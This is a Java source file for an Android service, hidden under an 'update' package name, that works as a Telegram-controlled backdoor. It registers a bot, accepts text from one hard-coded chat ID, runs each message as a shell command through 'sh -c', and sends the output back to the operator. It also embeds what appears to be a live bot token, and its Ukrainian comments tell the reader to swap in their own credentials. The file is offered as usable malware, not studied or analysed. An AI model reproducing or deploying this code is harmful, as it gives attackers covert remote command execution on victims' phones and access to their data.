package com.example.update.service;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import org.telegram.telegrambots.bots.TelegramLongPollingBot;
import org.telegram.telegrambots.meta.TelegramBotsApi;
import org.telegram.telegrambots.meta.api.objects.Update;
import org.telegram.telegrambots.meta.exceptions.TelegramApiException;
import org.telegram.telegrambots.updatesreceivers.DefaultBotSession;

import java.io.BufferedReader;
import java.io.InputStreamReader;

public class BackdoorService extends Service {
    private static final String BOT_TOKEN = "8599934080:AAHxNudBl007YqFulDU8kd6aSRYxbtKZMok"; // заміни на токен від @BotFather
    private static final long CHAT_ID = 7464215496; // твій Telegram ID, куди надходитимуть відповіді

    @Override
    public void onCreate() {
        super.onCreate();
        try {
            TelegramBotsApi botsApi = new TelegramBotsApi(DefaultBotSession.class);
            botsApi.registerBot(new BackdoorBot());
        } catch (TelegramApiException e) {
            e.printStackTrace();
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private class BackdoorBot extends TelegramLongPollingBot {
        @Override
        public void onUpdateReceived(Update update) {
            if (update.hasMessage() && update.getMessage().hasText()) {
                String cmd = update.getMessage().getText();
                if (update.getMessage().getChatId() == CHAT_ID) {
                    try {
                        String output = executeShell(cmd);
                        sendText(update.getMessage().getChatId(), output);
                    } catch (Exception e) {
                        sendText(update.getMessage().getChatId(), "Error: " + e.getMessage());
                    }
                }
            }
        }

        private String executeShell(String command) {
            try {
                Process process = Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                StringBuilder output = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }
                process.waitFor();
                return output.toString().isEmpty() ? "Command executed" : output.toString();
            } catch (Exception e) {
                return "Shell error: " + e.getMessage();
            }
        }

        private void sendText(long chatId, String text) {
            try {
                execute(new org.telegram.telegrambots.meta.api.methods.send.SendMessage()
                        .setChatId(chatId)
                        .setText(text));
            } catch (TelegramApiException e) {
                e.printStackTrace();
            }
        }

        @Override
        public String getBotUsername() {
            return "@Oavsush_bot"; // заміни на юзернейм свого бота
        }

        @Override
        public String getBotToken() {
            return BOT_TOKEN;
        }
    }
}
